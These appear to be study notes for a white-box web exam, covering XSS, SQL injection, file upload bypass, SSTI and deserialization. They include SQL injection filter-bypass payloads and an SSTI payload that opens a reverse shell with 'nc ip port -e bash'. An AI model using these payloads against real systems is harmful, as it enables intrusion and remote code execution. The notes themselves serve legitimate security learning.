### Methodology
* Understand how a web application works: asset discovery, routes, endpoints and functionalities.
* Follow how user data reaches from endpoint to certain parts of code.
* Check if proper input validation and output encoding is performed.
* Perform Above Steps Via BlackBox Then WhiteBox Testing
* you need to be discipled and limit allocated time to analysing individual parts of the application.

```
Tool familiarity plays a huge role here: be comfortable with your tools. For example it’s trivial to search for a method’s code references in Visual Studio or Jadx or DNSpy (you will deal with both of these last two). Just click a menu item or something. However in the exam, that won’t alway be possible. You have the decompilers, but no IDEs so you will either have to do your searches with Notepad++ or by grep’ing text via command line. In both cases you should know some basic RegEx to ease analysis.
```

### DNSPY
* You can modify the assemblies check pdf
* you can debug using it


### JDgui
* Decompile then save output to text editor


### Notepad++ or GREP
* be ready to use only these rather than awesome visual studio code


### XSS Notes
* use console to debug
* https://github.com/s0md3v/AwesomeXSS#awesome-polyglots
* that has filter bypass as well as payloads
* https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
* Try different polygot payloads as well as basic payloads everywhere

#### XSS SESSION HIJACKING/ SESSION RIDING
* once you get XSS to trigger run AJAX Requests to upload files or get RCE
* you can have python threaded server that hosts the javascript payload (also can write it to disk then cleanup)

```javascript
xhr = new XMLHttpRequest();
xhr.open("GET","URL");
xhr.send(NULL)
```

### SQLi
* always setup logging on the database
* always login as root and look at the schema its faster than looking at the models in the source code.
* if you think sqli might be possible try the following payloads

```
' '' " "" ; 
select/ version();
remember blind injections need a time-based payload sometimes
sometimes you can use /**/ instead of an actual space to bypass filters
AAAA')/**/or/**/(select)/**/1)=1%23
test payloads on the sql db to validate they can work since you should have access anyways
in burp you can see differences in response to determine true or false
you can extract information with boolean injections
select substring((select version()),1,1))='4';
you can use ascii substring to get numbers back to speed up process and bypass filters;
select ascii(substring((select version()),1,1))=52;
postgres allows stacked queries ;select something here
POSTGRES LOAD OWN DATABASE FUNCTIONS
POSTGRES UDF REVERSE SHELL
POSTGRES LARGE OBJECTS LOOK AT PDF
```
### File Upload Bypass
* edit mimetype
* edit extenstion php7,phtml etc
* edit magic bytes

### Magic hashes 
* keep this in mind when hashes are generated see if the functions that perform this are safe

### Loose Type Comparisons
* php and javascript watch for == instead of === you can use this to evaluate true without passing exact value

### Mapping JavaServlets
* use proccess explorer on windows
* WEB-INF/web.xml contains mappings
* decommpile main jar file instead of libraries
* save all sources into zip and extract into notepad++
* javaservlets usually have http request handlers look at those

### Overrite Files To get RCE
* potential path to shell is to overrite files that the server uses on startup to get shell
* use comments in eval functions to break out. use hex instead of regular chars
### Init Vuln Discovery
* use burp target feature to map public facing pages
* use repeater on pages that have login prompts or password reset forms and save those in notes
* login as admin and do the same to potential RCE passways
* Follow user supplied input
* follow functions that supposedly santize user input
* follow functions that are included in pages that deal with auth and stuff
* grep for evals,exec, readObject(), deserialization etc
* grep for sql queries
* notepad++ regex
```
^.*?query.*?select.*?
```

### SSTI
* {{7 * 7}}
* try this along with XSS
* #{root.process.mainModule.\u0072').exec('nc ip port -e bash')}

### Deserialization
* https://dumbsec.ninja/road-to-oscp-webgoat-insecure-deserialization-challenge.html
* YOSOSERIAL MULTIARG
* use classes that already exist in program that potentially can cause RCE (or use ysoserial)

### dnSpy Debug
* use call stack
* modify binary and keep debugging

### check imported javascript libraries burp sitemap

### List to Grep

#### Python
* eval
* pickle
* subprocess
* yaml
#### PHP
* exec
* shell_exec
* system
* serialize
#### Java
* readObject();
* document.write (dom based XSS)

#### Node
* eval()

#### C#
* XMLSerializer
* BinaryFormatter
* DataContractSerializer
* NetDataContractSerializer
* microsoft docs on classes